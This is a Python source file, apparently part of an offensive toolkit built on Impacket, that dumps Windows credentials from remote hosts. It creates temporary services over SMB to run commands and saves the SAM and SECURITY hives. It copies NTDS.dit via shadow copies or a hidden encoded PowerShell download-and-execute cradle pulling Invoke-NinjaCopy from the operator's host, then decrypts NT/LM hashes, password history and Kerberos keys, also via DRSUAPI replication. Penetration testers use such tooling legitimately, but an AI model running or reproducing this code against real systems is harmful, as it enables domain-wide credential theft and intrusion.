        regHandle = ans['phKey']
        try:
            ans = rrp.hBaseRegCreateKey(self.__rrp, regHandle, hiveName)
        except:
            raise Exception("Can't open %s hive" % hiveName)
        keyHandle = ans['phkResult']
        rrp.hBaseRegSaveKey(self.__rrp, keyHandle, tmpFileName)
        rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
        rrp.hBaseRegCloseKey(self.__rrp, regHandle)
        # Now let's open the remote file, so it can be read later
        remoteFileName = RemoteFile(self.__smbConnection, 'SYSTEM32\\'+tmpFileName)
        return remoteFileName

    def saveSAM(self):
        logging.debug('Saving remote SAM database')
        return self.__retrieveHive('SAM')

    def saveSECURITY(self):
        logging.debug('Saving remote SECURITY database')
        return self.__retrieveHive('SECURITY')

    def __executeRemote(self, data):
        self.__tmpServiceName = ''.join([random.choice(string.letters) for _ in range(8)]).encode('utf-16le')
        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' > ' + self.__batchFile + ' & ' + self.__shell + self.__batchFile
        command += ' & ' + 'del ' + self.__batchFile

        self.__serviceDeleted = False
        resp = scmr.hRCreateServiceW(self.__scmr, self.__scManagerHandle, self.__tmpServiceName, self.__tmpServiceName, lpBinaryPathName=command)
        service = resp['lpServiceHandle']
        try:
           scmr.hRStartServiceW(self.__scmr, service)
        except:
           pass
        scmr.hRDeleteService(self.__scmr, service)
        self.__serviceDeleted = True
        scmr.hRCloseServiceHandle(self.__scmr, service)
    
    def __answer(self, data):
        self.__answerTMP += data

    def __getLastVSS(self):
        self.__executeRemote('%COMSPEC% /C vssadmin list shadows')
        sleep(5)
        tries = 0
        while True:
            try:
                self.__smbConnection.getFile('ADMIN$', 'Temp\\' + OUTPUT_FILENAME, self.__answer)
                break
            except Exception, e:
                if tries > 30:
                    # We give up
                    raise Exception('Too many tries trying to list vss shadows')
                if str(e).find('SHARING') > 0:
                    # Stuff didn't finish yet.. wait more
                    sleep(5)
                    tries +=1
                    pass
                else:
                    raise

        lines = self.__answerTMP.split('\n')
        lastShadow = ''
        lastShadowFor = ''

        # Let's find the last one
        # The string used to search the shadow for drive. Wondering what happens
        # in other languages
        SHADOWFOR = 'Volume: ('

        for line in lines:
           if line.find('GLOBALROOT') > 0:
               lastShadow = line[line.find('\\\\?'):][:-1]
           elif line.find(SHADOWFOR) > 0:
               lastShadowFor = line[line.find(SHADOWFOR)+len(SHADOWFOR):][:2]

        self.__smbConnection.deleteFile('ADMIN$', 'Temp\\' + OUTPUT_FILENAME)

        return lastShadow, lastShadowFor

    def saveNTDS(self, ninja=False):
        logging.info('Searching for NTDS.dit')
        # First of all, let's try to read the target NTDS.dit registry entry
        ans = rrp.hOpenLocalMachine(self.__rrp)
        regHandle = ans['phKey']
        try:
            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters')
            keyHandle = ans['phkResult']
        except:
            # Can't open the registry path, assuming no NTDS on the other end
            return None

        try:
            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'DSA Database file')
            ntdsLocation = dataValue[:-1]
            ntdsDrive = ntdsLocation[:2]
        except:
            # Can't open the registry path, assuming no NTDS on the other end
            return None

        rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
        rrp.hBaseRegCloseKey(self.__rrp, regHandle)

        if ninja is True:
            logging.info('Registry says NTDS.dit is at %s' % ntdsLocation)
            tmpFileName = ''.join([random.choice(string.letters) for _ in range(8)]) + '.tmp'
            local_ip = self.__smbConnection.getSMBServer().get_socket().getsockname()[0]

            command = """
            IEX (New-Object Net.WebClient).DownloadString('http://{addr}/Invoke-NinjaCopy.ps1');
            Invoke-NinjaCopy -Path "{ntdspath}" -LocalDestination "$env:systemroot\\Temp\\{tmpname}";
            """.format(addr=local_ip, ntdspath=ntdsLocation, tmpname=tmpFileName)
            
            self.__executeRemote('%%COMSPEC%% /C powershell.exe -exec bypass -window hidden -noni -nop -encoded %s' % ps_command(command=command))
            remoteFileName = RemoteFile(self.__smbConnection, 'Temp\\%s' % tmpFileName)

        else:
            logging.info('Registry says NTDS.dit is at %s. Calling vssadmin to get a copy. This might take some time' % ntdsLocation)
            # Get the list of remote shadows
            shadow, shadowFor = self.__getLastVSS()
            if shadow == '' or (shadow != '' and shadowFor != ntdsDrive):
                # No shadow, create one
                self.__executeRemote('%%COMSPEC%% /C vssadmin create shadow /For=%s' % ntdsDrive)
                shadow, shadowFor = self.__getLastVSS()
                shouldRemove = True
                if shadow == '':
                    raise Exception('Could not get a VSS')
            else:
                shouldRemove = False

            # Now copy the ntds.dit to the temp directory
            tmpFileName = ''.join([random.choice(string.letters) for _ in range(8)]) + '.tmp'

            self.__executeRemote('%%COMSPEC%% /C copy %s%s %%SYSTEMROOT%%\\Temp\\%s' % (shadow, ntdsLocation[2:], tmpFileName))

            if shouldRemove is True:
                self.__executeRemote('%%COMSPEC%% /C vssadmin delete shadows /For=%s /Quiet' % ntdsDrive)

            self.__smbConnection.deleteFile('ADMIN$', 'Temp\\' + OUTPUT_FILENAME)

            remoteFileName = RemoteFile(self.__smbConnection, 'Temp\\%s' % tmpFileName)

        return remoteFileName

class NTDSHashes:
    NAME_TO_INTERNAL = {
        'uSNCreated':'ATTq131091',
        'uSNChanged':'ATTq131192',
        'name':'ATTm3',
        'objectGUID':'ATTk589826',
        'objectSid':'ATTr589970',
        'userAccountControl':'ATTj589832',
        'primaryGroupID':'ATTj589922',
        'accountExpires':'ATTq589983',
        'logonCount':'ATTj589993',
        'sAMAccountName':'ATTm590045',
        'sAMAccountType':'ATTj590126',
        'lastLogonTimestamp':'ATTq589876',
        'userPrincipalName':'ATTm590480',
        'unicodePwd':'ATTk589914',
        'dBCSPwd':'ATTk589879',
        'ntPwdHistory':'ATTk589918',
        'lmPwdHistory':'ATTk589984',
        'pekList':'ATTk590689',
        'supplementalCredentials':'ATTk589949',
    }

    NAME_TO_ATTRTYP = {
        'userPrincipalName': 0x90290,
        'sAMAccountName': 0x900DD,
        'unicodePwd': 0x9005A,
        'dBCSPwd': 0x90037,
        'ntPwdHistory': 0x9005E,
        'lmPwdHistory': 0x900A0,
        'supplementalCredentials': 0x9007D,
        'objectSid': 0x90092,
    }

    KERBEROS_TYPE = {
        1:'dec-cbc-crc',
        3:'des-cbc-md5',
        17:'aes128-cts-hmac-sha1-96',
        18:'aes256-cts-hmac-sha1-96',
        0xffffff74:'rc4_hmac',
    }

    INTERNAL_TO_NAME = dict((v,k) for k,v in NAME_TO_INTERNAL.iteritems())

    SAM_NORMAL_USER_ACCOUNT = 0x30000000
    SAM_MACHINE_ACCOUNT     = 0x30000001
    SAM_TRUST_ACCOUNT       = 0x30000002

    ACCOUNT_TYPES = ( SAM_NORMAL_USER_ACCOUNT, SAM_MACHINE_ACCOUNT, SAM_TRUST_ACCOUNT)

    class PEK_KEY(Structure):
        structure = (
            ('Header','8s=""'),
            ('KeyMaterial','16s=""'),
            ('EncryptedPek','52s=""'),
        )

    class CRYPTED_HASH(Structure):
        structure = (
            ('Header','8s=""'),
            ('KeyMaterial','16s=""'),
            ('EncryptedHash','16s=""'),
        )

    class CRYPTED_HISTORY(Structure):
        structure = (
            ('Header','8s=""'),
            ('KeyMaterial','16s=""'),
            ('EncryptedHash',':'),
        )

    class CRYPTED_BLOB(Structure):
        structure = (
            ('Header','8s=""'),
            ('KeyMaterial','16s=""'),
            ('EncryptedHash',':'),
        )

    def __init__(self, ntdsFile, bootKey, noLMHash=True, remoteOps=None, useVSSMethod=False):
        self.__bootKey = bootKey
        self.__NTDS = ntdsFile
        self.__history = False
        self.__noLMHash = noLMHash
        self.__useVSSMethod = useVSSMethod
        self.dumped_hashes = {'hashes': [], 'kerb': []}
        self.__remoteOps = remoteOps
        if self.__NTDS is not None:
            self.__ESEDB = ESENT_DB(ntdsFile, isRemote = True)
            self.__cursor = self.__ESEDB.openTable('datatable')
        self.__tmpUsers = list()
        self.__PEK = None
        self.__cryptoCommon = CryptoCommon()
        self.__hashesFound = {}
        self.__kerberosKeys = OrderedDict()

    def __getPek(self):
        logging.info('Searching for pekList, be patient')
        pek = None
        while True:
            record = self.__ESEDB.getNextRow(self.__cursor)
            if record is None:
                break
            elif record[self.NAME_TO_INTERNAL['pekList']] is not None:
                pek =  unhexlify(record[self.NAME_TO_INTERNAL['pekList']])
                break
            elif record[self.NAME_TO_INTERNAL['sAMAccountType']] in self.ACCOUNT_TYPES:
                # Okey.. we found some users, but we're not yet ready to process them.
                # Let's just store them in a temp list
                self.__tmpUsers.append(record)

        if pek is not None:
            encryptedPek = self.PEK_KEY(pek)
            md5 = hashlib.new('md5')
            md5.update(self.__bootKey)
            for i in range(1000):
                md5.update(encryptedPek['KeyMaterial'])
            tmpKey = md5.digest()
            rc4 = ARC4.new(tmpKey)
            plainText = rc4.encrypt(encryptedPek['EncryptedPek'])
            self.__PEK = plainText[36:]

    def __removeRC4Layer(self, cryptedHash):
        md5 = hashlib.new('md5')
        md5.update(self.__PEK)
        md5.update(cryptedHash['KeyMaterial'])
        tmpKey = md5.digest()
        rc4 = ARC4.new(tmpKey)
        plainText = rc4.encrypt(cryptedHash['EncryptedHash'])

        return plainText

    def __removeDESLayer(self, cryptedHash, rid):
        Key1,Key2 = self.__cryptoCommon.deriveKey(int(rid))

        Crypt1 = DES.new(Key1, DES.MODE_ECB)
        Crypt2 = DES.new(Key2, DES.MODE_ECB)

        decryptedHash = Crypt1.decrypt(cryptedHash[:8]) + Crypt2.decrypt(cryptedHash[8:])

        return decryptedHash

    def __decryptSupplementalInfo(self, record, rid=None):
        # This is based on [MS-SAMR] 2.2.10 Supplemental Credentials Structures
        haveInfo = False
        if self.__useVSSMethod is True:
            if record[self.NAME_TO_INTERNAL['supplementalCredentials']] is not None:
                if len(unhexlify(record[self.NAME_TO_INTERNAL['supplementalCredentials']])) > 24:
                    if record[self.NAME_TO_INTERNAL['userPrincipalName']] is not None:
                        domain = record[self.NAME_TO_INTERNAL['userPrincipalName']].split('@')[-1]
                        userName = '%s\\%s' % (domain, record[self.NAME_TO_INTERNAL['sAMAccountName']])
                    else:
                        userName = '%s' % record[self.NAME_TO_INTERNAL['sAMAccountName']]
                    cipherText = self.CRYPTED_BLOB(unhexlify(record[self.NAME_TO_INTERNAL['supplementalCredentials']]))
                    plainText = self.__removeRC4Layer(cipherText)
                    haveInfo = True
        else:
            domain = None
            userName = None
            for attr in record['pmsgOut']['V6']['pObjects']['Entinf']['AttrBlock']['pAttr']:
                if attr['attrTyp'] == self.NAME_TO_ATTRTYP['userPrincipalName']:
                    if attr['AttrVal']['valCount'] > 0:
                        try:
                            domain = ''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le').split('@')[-1]
                        except:
                            domain = None
                    else:
                        domain = None
                elif attr['attrTyp'] == self.NAME_TO_ATTRTYP['sAMAccountName']:
                    if attr['AttrVal']['valCount'] > 0:
                        try:
                            userName = ''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le')
                        except:
                            logging.error('Cannot get sAMAccountName for %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
                            userName = 'unknown'
                    else:
                        logging.error('Cannot get sAMAccountName for %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
                        userName = 'unknown'
                if attr['attrTyp'] == self.NAME_TO_ATTRTYP['supplementalCredentials']:
                    if attr['AttrVal']['valCount'] > 0:
                        blob = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                        plainText = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), blob)
                        if len(plainText) > 24:
                            haveInfo = True
            if domain is not None:
                userName = '%s\\%s' % (domain, userName)

        if haveInfo is True:
            try:
                userProperties = samr.USER_PROPERTIES(plainText)
            except:
                # On some old w2k3 there might be user properties that don't
                # match [MS-SAMR] structure, discarding them
                return
            propertiesData = userProperties['UserProperties']
            for propertyCount in range(userProperties['PropertyCount']):
                userProperty = samr.USER_PROPERTY(propertiesData)
                propertiesData = propertiesData[len(userProperty):]
                # For now, we will only process Newer Kerberos Keys.
                if userProperty['PropertyName'].decode('utf-16le') == 'Primary:Kerberos-Newer-Keys':
                    propertyValueBuffer = unhexlify(userProperty['PropertyValue'])
                    kerbStoredCredentialNew = samr.KERB_STORED_CREDENTIAL_NEW(propertyValueBuffer)
                    data = kerbStoredCredentialNew['Buffer']
                    for credential in range(kerbStoredCredentialNew['CredentialCount']):
                        keyDataNew = samr.KERB_KEY_DATA_NEW(data)
                        data = data[len(keyDataNew):]
                        keyValue = propertyValueBuffer[keyDataNew['KeyOffset']:][:keyDataNew['KeyLength']]

                        if  self.KERBEROS_TYPE.has_key(keyDataNew['KeyType']):
                            answer =  "%s:%s:%s" % (userName, self.KERBEROS_TYPE[keyDataNew['KeyType']],hexlify(keyValue))
                        else:
                            answer =  "%s:%s:%s" % (userName, hex(keyDataNew['KeyType']),hexlify(keyValue))
                        # We're just storing the keys, not printing them, to make the output more readable
                        # This is kind of ugly... but it's what I came up with tonight to get an ordered
                        # set :P. Better ideas welcomed ;)
                        self.__kerberosKeys[answer] = None

    def __decryptHash(self, record, rid=None):
        if self.__useVSSMethod is True:
            logging.debug('Decrypting hash for user: %s' % record[self.NAME_TO_INTERNAL['name']])

            sid = SAMR_RPC_SID(unhexlify(record[self.NAME_TO_INTERNAL['objectSid']]))
            rid = sid.formatCanonical().split('-')[-1]

            if record[self.NAME_TO_INTERNAL['dBCSPwd']] is not None:
                encryptedLMHash = self.CRYPTED_HASH(unhexlify(record[self.NAME_TO_INTERNAL['dBCSPwd']]))
                tmpLMHash = self.__removeRC4Layer(encryptedLMHash)
                LMHash = self.__removeDESLayer(tmpLMHash, rid)
            else:
                LMHash = ntlm.LMOWFv1('', '')

            if record[self.NAME_TO_INTERNAL['unicodePwd']] is not None:
                encryptedNTHash = self.CRYPTED_HASH(unhexlify(record[self.NAME_TO_INTERNAL['unicodePwd']]))
                tmpNTHash = self.__removeRC4Layer(encryptedNTHash)
                NTHash = self.__removeDESLayer(tmpNTHash, rid)
            else:
                NTHash = ntlm.NTOWFv1('', '')

            if record[self.NAME_TO_INTERNAL['userPrincipalName']] is not None:
                domain = record[self.NAME_TO_INTERNAL['userPrincipalName']].split('@')[-1]
                userName = '%s\\%s' % (domain, record[self.NAME_TO_INTERNAL['sAMAccountName']])
            else:
                userName = '%s' % record[self.NAME_TO_INTERNAL['sAMAccountName']]

            answer = "%s:%s:%s:%s:::" % (userName, rid, hexlify(LMHash), hexlify(NTHash))
            self.__hashesFound[unhexlify(record[self.NAME_TO_INTERNAL['objectSid']])] = answer
            self.dumped_hashes['hashes'].append(answer)

            if self.__history:
                LMHistory = []
                NTHistory = []
                if record[self.NAME_TO_INTERNAL['lmPwdHistory']] is not None:
                    encryptedLMHistory = self.CRYPTED_HISTORY(unhexlify(record[self.NAME_TO_INTERNAL['lmPwdHistory']]))
                    tmpLMHistory = self.__removeRC4Layer(encryptedLMHistory)
                    for i in range(0, len(tmpLMHistory) / 16):
                        LMHash = self.__removeDESLayer(tmpLMHistory[i * 16:(i + 1) * 16], rid)
                        LMHistory.append(LMHash)

                if record[self.NAME_TO_INTERNAL['ntPwdHistory']] is not None:
                    encryptedNTHistory = self.CRYPTED_HISTORY(unhexlify(record[self.NAME_TO_INTERNAL['ntPwdHistory']]))
                    tmpNTHistory = self.__removeRC4Layer(encryptedNTHistory)
                    for i in range(0, len(tmpNTHistory) / 16):
                        NTHash = self.__removeDESLayer(tmpNTHistory[i * 16:(i + 1) * 16], rid)
                        NTHistory.append(NTHash)

                for i, (LMHash, NTHash) in enumerate(
                        map(lambda l, n: (l, n) if l else ('', n), LMHistory[1:], NTHistory[1:])):
                    if self.__noLMHash:
                        lmhash = hexlify(ntlm.LMOWFv1('', ''))
                    else:
                        lmhash = hexlify(LMHash)

                    answer = "%s_history%d:%s:%s:%s:::" % (userName, i, rid, lmhash, hexlify(NTHash))
                    self.__hashesFound[unhexlify(record[self.NAME_TO_INTERNAL['objectSid']]) + str(i)] = answer
                    self.dumped_hashes['hashes'].append(answer)
        else:
            logging.debug('Decrypting hash for user: %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
            domain = None
            if self.__history:
                LMHistory = []
                NTHistory = []
            for attr in record['pmsgOut']['V6']['pObjects']['Entinf']['AttrBlock']['pAttr']:
                if attr['attrTyp'] == self.NAME_TO_ATTRTYP['dBCSPwd']:
                    if attr['AttrVal']['valCount'] > 0:
                        encrypteddBCSPwd = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                        encryptedLMHash = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), encrypteddBCSPwd)
                        LMHash = drsuapi.removeDESLayer(encryptedLMHash, rid)
                    else:
                        LMHash = ntlm.LMOWFv1('', '')
                elif attr['attrTyp'] == self.NAME_TO_ATTRTYP['unicodePwd']:
                    if attr['AttrVal']['valCount'] > 0:
                        encryptedUnicodePwd = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                        encryptedNTHash = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), encryptedUnicodePwd)
                        NTHash = drsuapi.removeDESLayer(encryptedNTHash, rid)
                    else:
                        NTHash = ntlm.NTOWFv1('', '')
                elif attr['attrTyp'] == self.NAME_TO_ATTRTYP['userPrincipalName']:
                    if attr['AttrVal']['valCount'] > 0:
                        try:
                            domain = ''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le').split('@')[-1]
                        except:
                            domain = None
                    else:
                        domain = None
                elif attr['attrTyp'] == self.NAME_TO_ATTRTYP['sAMAccountName']:
                    if attr['AttrVal']['valCount'] > 0:
                        try:
                            userName = ''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le')
                        except:
                            logging.error('Cannot get sAMAccountName for %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
                            userName = 'unknown'
                    else:
                        logging.error('Cannot get sAMAccountName for %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
                        userName = 'unknown'
                elif attr['attrTyp'] == self.NAME_TO_ATTRTYP['objectSid']:
                    if attr['AttrVal']['valCount'] > 0:
                        objectSid = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                    else:
                        logging.error('Cannot get objectSid for %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
                        objectSid = rid

                if self.__history:
                    if attr['attrTyp'] == self.NAME_TO_ATTRTYP['lmPwdHistory']:
                        if attr['AttrVal']['valCount'] > 0:
                            encryptedLMHistory = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                            tmpLMHistory = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), encryptedLMHistory)
                            for i in range(0, len(tmpLMHistory) / 16):
                                LMHashHistory = drsuapi.removeDESLayer(tmpLMHistory[i * 16:(i + 1) * 16], rid)
                                LMHistory.append(LMHashHistory)
                        else:
                            logging.debug('No lmPwdHistory for user %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
                    elif attr['attrTyp'] == self.NAME_TO_ATTRTYP['ntPwdHistory']:
                        if attr['AttrVal']['valCount'] > 0:
                            encryptedNTHistory = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                            tmpNTHistory = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), encryptedNTHistory)
                            for i in range(0, len(tmpNTHistory) / 16):
                                NTHashHistory = drsuapi.removeDESLayer(tmpNTHistory[i * 16:(i + 1) * 16], rid)
                                NTHistory.append(NTHashHistory)
                        else:
                            logging.debug('No ntPwdHistory for user %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])

            if domain is not None:
                userName = '%s\\%s' % (domain, userName)

            answer = "%s:%s:%s:%s:::" % (userName, rid, hexlify(LMHash), hexlify(NTHash))
            self.__hashesFound[objectSid] = answer
            self.dumped_hashes['hashes'].append(answer)

            if self.__history:
                for i, (LMHashHistory, NTHashHistory) in enumerate(
                        map(lambda l, n: (l, n) if l else ('', n), LMHistory[1:], NTHistory[1:])):
                    if self.__noLMHash:
                        lmhash = hexlify(ntlm.LMOWFv1('', ''))
                    else:
                        lmhash = hexlify(LMHashHistory)

                    answer = "%s_history%d:%s:%s:%s:::" % (userName, i, rid, lmhash, hexlify(NTHashHistory))
                    self.__hashesFound[objectSid + str(i)] = answer
                    print answer

    def dump(self):
        if self.__NTDS is None and self.__useVSSMethod is True:
            # No NTDS.dit file provided and were asked to use VSS
            return
        else:
            try:
                self.__remoteOps.connectSamr(self.__remoteOps.getMachineNameAndDomain()[1])
            except:
                # Target's not a DC
                return

        logging.info('Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)')
        if self.__useVSSMethod:
            # We start getting rows from the table aiming at reaching
            # the pekList. If we find users records we stored them
            # in a temp list for later process.
            self.__getPek()
            if self.__PEK is not None:
                logging.info('Pek found and decrypted: 0x%s' % hexlify(self.__PEK))
                logging.info('Reading and decrypting hashes from %s ' % self.__NTDS)
                # First of all, if we have users already cached, let's decrypt their hashes
                for record in self.__tmpUsers:
                    try:
                        self.__decryptHash(record)
                        self.__decryptSupplementalInfo(record)
                    except Exception, e:
                        # import traceback
                        # print traceback.print_exc()
                        try:
                            logging.error(
                                "Error while processing row for user %s" % record[self.NAME_TO_INTERNAL['name']])
                            logging.error(str(e))
                            pass
                        except:
                            logging.error("Error while processing row!")
                            logging.error(str(e))
                            pass

                # Now let's keep moving through the NTDS file and decrypting what we find
                while True:
                    try:
                        record = self.__ESEDB.getNextRow(self.__cursor)
                    except:
                        logging.error('Error while calling getNextRow(), trying the next one')
                        continue

                    if record is None:
                        break
                    try:
                        if record[self.NAME_TO_INTERNAL['sAMAccountType']] in self.ACCOUNT_TYPES:
                            self.__decryptHash(record)
                            self.__decryptSupplementalInfo(record)
                    except Exception, e:
                        # import traceback
                        # print traceback.print_exc()
                        try:
                            logging.error(
                                "Error while processing row for user %s" % record[self.NAME_TO_INTERNAL['name']])
                            logging.error(str(e))
                            pass
                        except:
                            logging.error("Error while processing row!")
                            logging.error(str(e))
                            pass
        else:
            logging.info('Using the DRSUAPI method to get NTDS.DIT secrets')
            status = STATUS_MORE_ENTRIES
            enumerationContext = 0
            while status == STATUS_MORE_ENTRIES:
                resp = self.__remoteOps.getDomainUsers(enumerationContext)

                for user in resp['Buffer']['Buffer']:
                    userName = user['Name']

                    userSid = self.__remoteOps.ridToSid(user['RelativeId'])

                    # Let's crack the user sid into DS_FQDN_1779_NAME
                    # In theory I shouldn't need to crack the sid. Instead
                    # I could use it when calling DRSGetNCChanges inside the DSNAME parameter.
                    # For some reason tho, I get ERROR_DS_DRA_BAD_DN when doing so.
                    crackedName = self.__remoteOps.DRSCrackNames(drsuapi.DS_NAME_FORMAT.DS_SID_OR_SID_HISTORY_NAME, drsuapi.DS_NAME_FORMAT.DS_FQDN_1779_NAME, name = userSid.formatCanonical())

                    if crackedName['pmsgOut']['V1']['pResult']['cItems'] == 1:
                        userRecord = self.__remoteOps.DRSGetNCChanges(crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1])
                        #userRecord.dump()
                        if userRecord['pmsgOut']['V6']['cNumObjects'] == 0:
                            raise Exception('DRSGetNCChanges didn\'t return any object!')
                    else:
                        logging.warning('DRSCrackNames returned %d items for user %s, skipping' %(crackedName['pmsgOut']['V1']['pResult']['cItems'], userName))
                    try:
                        self.__decryptHash(userRecord, user['RelativeId'])
                        self.__decryptSupplementalInfo(userRecord, user['RelativeId'])
                    except Exception, e:
                        #import traceback
                        #traceback.print_exc()
                        logging.error("Error while processing user!")
                        logging.error(str(e))

                enumerationContext = resp['EnumerationContext']
                status = resp['ErrorCode']

        # Now we'll print the Kerberos keys. So we don't mix things up in the output.
        if len(self.__kerberosKeys) > 0:
            if self.__useVSSMethod is True:
                logging.info('Kerberos keys from %s ' % self.__NTDS)
            else:
                logging.info('Kerberos keys grabbed')

            for itemKey in self.__kerberosKeys.keys():
                self.dumped_hashes['kerb'].append(itemKey)

        return self.dumped_hashes

    def export(self, fileName):
        if len(self.__hashesFound) > 0:
            items = sorted(self.__hashesFound)
            fd = open(fileName+'.ntds','w+')
            for item in items:
                try:
                    fd.write(self.__hashesFound[item]+'\n')
                except:
                    try:
                        logging.error("Error writing entry %d, skipping" % item)
                    except:
                        logging.error("Error writing entry, skipping")
                    pass
            fd.close()
        if len(self.__kerberosKeys) > 0:
            fd = open(fileName+'.ntds.kerberos','w+')
            for itemKey in self.__kerberosKeys.keys():
                fd.write(itemKey+'\n')
            fd.close()

    def finish(self):
        if self.__NTDS is not None:
            self.__ESEDB.close()

class DumpSecrets:
    def __init__(self, address, username='', password='', domain='', hashes=None, sam=False, ntds=False, useVSSMethod=False, useNinjaMethod=False):
        self.__remoteAddr = address
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__sam = sam
        self.__ntds = ntds
        self.__useVSSMethod = useVSSMethod
        self.__useNinjaMethod = useNinjaMethod
        self.__remoteOps = None
        self.__SAMHashes = None
        self.__isRemote = True
        self.dumped_ntds_hashes = None
        self.dumped_sam_hashes = None
        if hashes:
            self.__lmhash, self.__nthash = hashes.split(':')

    def getBootKey(self):
        # Local Version whenever we are given the files directly
        bootKey = ''
        tmpKey = ''
        winreg = winregistry.Registry(self.__systemHive, self.__isRemote)
        # We gotta find out the Current Control Set
        currentControlSet = winreg.getValue('\\Select\\Current')[1]
        currentControlSet = "ControlSet%03d" % currentControlSet
        for key in ['JD','Skew1','GBG','Data']:
            logging.debug('Retrieving class info for %s'% key)
            ans = winreg.getClass('\\%s\\Control\\Lsa\\%s' % (currentControlSet,key))
            digit = ans[:16].decode('utf-16le')
            tmpKey = tmpKey + digit

        transforms = [ 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 ]

        tmpKey = unhexlify(tmpKey)

        for i in xrange(len(tmpKey)):
            bootKey += tmpKey[transforms[i]]

        logging.info('Target system bootKey: 0x%s' % hexlify(bootKey))

        return bootKey

    def checkNoLMHashPolicy(self):
        logging.debug('Checking NoLMHash Policy')
        winreg = winregistry.Registry(self.__systemHive, self.__isRemote)
        # We gotta find out the Current Control Set
        currentControlSet = winreg.getValue('\\Select\\Current')[1]
        currentControlSet = "ControlSet%03d" % currentControlSet

        #noLmHash = winreg.getValue('\\%s\\Control\\Lsa\\NoLmHash' % currentControlSet)[1]
        noLmHash = winreg.getValue('\\%s\\Control\\Lsa\\NoLmHash' % currentControlSet)
        if noLmHash is not None:
            noLmHash = noLmHash[1]
        else:
            noLmHash = 0

        if noLmHash != 1:
            logging.debug('LMHashes are being stored')
            return False
        logging.debug('LMHashes are NOT being stored')
        return True

    def dump(self, smbconnection):
        try:
            self.__remoteOps = RemoteOperations(smbconnection)
            self.__remoteOps.enableRegistry()
            bootKey = self.__remoteOps.getBootKey()

            # Let's check whether target system stores LM Hashes
            self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
            SECURITYFileName = self.__remoteOps.saveSECURITY()

            if self.__sam is True:
                SAMFileName = self.__remoteOps.saveSAM()

                self.__SAMHashes = SAMHashes(SAMFileName, bootKey)
                self.dumped_sam_hashes = self.__SAMHashes.dump()

            elif self.__ntds is True:
                if self.__useVSSMethod:
                    NTDSFileName = self.__remoteOps.saveNTDS()
                elif self.__useNinjaMethod:
                    NTDSFileName = self.__remoteOps.saveNTDS(ninja=True)
                    self.__useVSSMethod = True
                else:
                    NTDSFileName = None

                self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, noLMHash=self.__noLMHash, remoteOps=self.__remoteOps, useVSSMethod=self.__useVSSMethod)
                try:
                    self.dumped_ntds_hashes = self.__NTDSHashes.dump()
                except Exception, e:
                    logging.error(e)
                    if self.__useVSSMethod is False:
                        logging.info('Something wen\'t wrong with the DRSUAPI approach. Try again with -use-vss parameter')

        except (Exception, KeyboardInterrupt) as e:
            traceback.print_exc()
            try:
                self.cleanup()
            except:
                pass

    def cleanup(self):
        logging.info('Cleaning up... ')
        if self.__remoteOps:
            self.__remoteOps.finish()
        if self.__SAMHashes:
            self.__SAMHashes.finish()
        if self.__NTDSHashes:
            self.__NTDSHashes.finish()

class ListUsersException(Exception):
    pass

class SAMRDump:
    KNOWN_PROTOCOLS = {
        '139/SMB': (r'ncacn_np:%s[\pipe\samr]', 139),
        '445/SMB': (r'ncacn_np:%s[\pipe\samr]', 445),
        }


    def __init__(self, protocols = None, username = '', password = '', domain = '', hashes = None, aesKey=None, doKerberos = False):
        if not protocols:
            self.__protocols = SAMRDump.KNOWN_PROTOCOLS.keys()
        else:
            self.__protocols = [protocols]

        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        if hashes:
            self.__lmhash, self.__nthash = hashes.split(':')

    def connect(self, addr):
        """Dumps the list of users and shares registered present at
        addr. Addr is a valid host name or IP address.
        """
        #logging.info('Retrieving endpoint list from %s' % addr)

        # Try all requested protocols until one works.
        for protocol in self.__protocols:
            protodef = SAMRDump.KNOWN_PROTOCOLS[protocol]
            port = protodef[1]

            #logging.info("Trying protocol %s..." % protocol)
            rpctransport = transport.SMBTransport(addr, port, r'\samr', self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, doKerberos = self.__doKerberos)
            dce = rpctransport.get_dce_rpc()

            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)

            resp = samr.hSamrConnect(dce)
            serverHandle = resp['ServerHandle'] 

            resp = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
            domains = resp['Buffer']['Buffer']

            resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle, domains[0]['Name'])

